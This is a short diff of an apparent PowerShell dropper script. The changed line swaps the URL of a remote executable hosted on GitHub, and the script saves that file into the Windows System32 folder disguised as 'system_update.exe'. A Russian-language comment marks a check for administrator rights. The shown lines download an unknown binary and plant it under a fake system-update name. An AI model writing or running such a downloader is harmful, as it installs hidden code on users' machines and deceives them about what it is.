@@ -2,7 +2,7 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-$url = "https://github.com/nagibatorm55-ops/errorcheck/raw/refs/heads/main/i06473dr7ygcah7o.exe"
+$url = "https://github.com/nagibatorm55-ops/errordumpe/raw/refs/heads/main/errordump.exe"
 $destPath = "$env:SystemRoot\System32\system_update.exe"
 
 # Проверка прав Архимага
